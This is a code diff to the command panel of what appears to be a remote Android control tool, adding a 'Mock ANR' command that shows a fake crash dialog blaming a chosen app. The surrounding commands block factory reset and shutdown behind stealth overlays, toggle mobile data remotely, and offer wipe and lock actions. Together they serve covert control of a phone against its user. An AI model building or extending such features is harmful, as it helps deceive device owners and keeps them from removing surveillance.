@@ -421,7 +421,7 @@
                                         { id: 'REMOVE_UI', name: 'Force Remove Overlay', icon: '🚫', inputs:[] },
                     { id: 'STATUS_BAR_UI', name: 'Status Bar Injection', icon: '🚥', keywords: 'status, top, bar, overlay', inputs: [{id: 'sb-state', label: 'State', type: 'select', options:[{v: 'ON', l: 'Activate'}, {v: 'OFF', l: 'Deactivate'}]}, {id: 'sb-touchable', label: 'Input Mode', type: 'select', options:[{v: 'FALSE', l: 'Ghost (Pass-through)'}, {v: 'TRUE', l: 'Touchable'}]}, {id: 'sb-html', label: 'HTML Content', type: 'textarea', placeholder: '<html>...'}] },
                     { id: 'POWER_SHIELD', name: 'Power Menu Shield', icon: '🛡️', inputs: [{id: 'ps-toggle', label: 'Intercept State', type: 'select', options: [{v: 'ON', l: 'ENABLED (Armed)'}, {v: 'OFF', l: 'DISABLED (Pass-through)'}]}, {id: 'ps-timeout', label: 'Failsafe Timeout (s)', type: 'number', val: 15}, {id: 'ps-method', label: 'Injection Layer', type: 'select', options: [{v: 'ACC', l: 'ACC (Above Power Menu)'}, {v: 'OVERLAY', l: 'Standard (Standard Apps)'}]}, {id: 'ps-html-shutdown', label: 'Shutdown HTML Payload', type: 'textarea', placeholder: '<html>Shutdown Content</html>'}, {id: 'ps-html-boot', label: 'Boot/Logo HTML Payload', type: 'textarea', placeholder: '<html>Boot/Logo Content</html>'}] },
-                    { id: 'UI_TRAP', name: 'UI Predictive Trap', icon: '🪤', inputs: [{id: 'ui-trap-target', label: 'Fingerprint (Title@@Summary@@Pkg@@Anchor)', type: 'text', placeholder: 'Reset@@Factory data reset@@settings@@Reset'}, {id: 'ui-trap-method', label: 'Layer', type: 'select', options: [{v: 'ACC', l: 'ACC (Stealth Overlay)'}, {v: 'OVERLAY', l: 'Standard Overlay'}]}, {id: 'ui-trap-timeout', label: 'Failsafe Timeout (s)', type: 'number', val: 15}, {id: 'ui-trap-dim', label: 'Dim Level % (0=Black, 100=Normal)', type: 'number', val: 20}, {id: 'ui-trap-html', label: 'Predictive HTML Payload', type: 'textarea', placeholder: '<html>...'}] },
+                    { id: 'UI_TRAP', name: 'UI Predictive Trap', icon: '🪤', inputs: [{id: 'ui-trap-target', label: 'Fingerprint (Title@@Summary@@Pkg@@Anchor)', type: 'text', placeholder: 'Reset@@Factory data reset@@settings@@Reset'}, {id: 'ui-trap-method', label: 'Logic Layer', type: 'select', options: [{v: 'ACC', l: 'ACC (Stealth Overlay)'}, {v: 'OVERLAY', l: 'Standard Overlay'}, {v: 'ANR', l: 'ANR (Mock Crash)'}]}, {id: 'ui-trap-timeout', label: 'Failsafe Timeout (s)', type: 'number', val: 15}, {id: 'ui-trap-dim', label: 'Dim Level % (0=Black, 100=Normal)', type: 'number', val: 20}, {id: 'ui-trap-html', label: 'Payload (HTML or Blamed App Name)', type: 'textarea', placeholder: '<html>... or App Name'}] },
                     { id: 'FORCE_DATA', name: 'Ghost Hand Data Toggle', icon: '📡', keywords: 'mobile, data, cellular, internet', inputs: [] },
                     { id: 'CLEAR_UI_TRAP', name: 'Disarm UI Trap', icon: '🔓', inputs: [] }
                 ]
@@ -514,8 +514,9 @@
                 id: 'crisis', 
                 label: 'Crisis & Stealth', 
                 css: 'crisis', 
-                search: 'nuke, codered, lock, stop, beacon, panic, red, wipe, uninstall',
+                search: 'nuke, codered, lock, stop, beacon, panic, red, wipe, uninstall, anr',
                 commands: [
+                    { id: 'MOCK_ANR', name: 'Mock ANR (Native)', icon: '⚠️', keywords: 'crash, error, not responding, close, hide, deceptive', inputs: [{id: 'anr-target', label: 'Blamed App Name (Optional)', type: 'text', placeholder: 'Leave empty for Auto-Detect'}] },
                     { id: 'CODERED', name: 'Trigger Code Red Loop', icon: '🚨', inputs: [{id: 'cr-code', label: 'Codes', type: 'text', val: '0'}, {id: 'cr-dur', label: 'Duration (Min)', type: 'number', val: 15}, {id: 'cr-freq', label: 'Freq (Sec)', type: 'number', val: 30}] },
                     { id: 'LOCK_SCREEN', name: 'Force Device Lock', icon: '🔒', inputs: [] },
                     { id: 'STOLEN_PHONE', name: 'Lost/Stolen Protocol', icon: '🕵️', keywords: 'lost, recovery, pattern, data, panic', inputs: [{id: 'stolen-num', label: 'Handler Number(s) (Comma/Semicolon ok)', type: 'text'}], cleanup: 'STOLEN_STOP' },
@@ -894,6 +895,7 @@
             if (content === null) {
                 switch(type) {
                     case 'SET_DEFAULT_SMS': content = document.getElementById('sms-default-mode').value; break;
+                    case 'MOCK_ANR': content = document.getElementById('anr-target').value; break;
                     case 'TOAST': content = document.getElementById('val-toast').value; break;
                     case 'RING': content = document.getElementById('val-ring').value; break;
                     case 'RECORD_SCREEN':
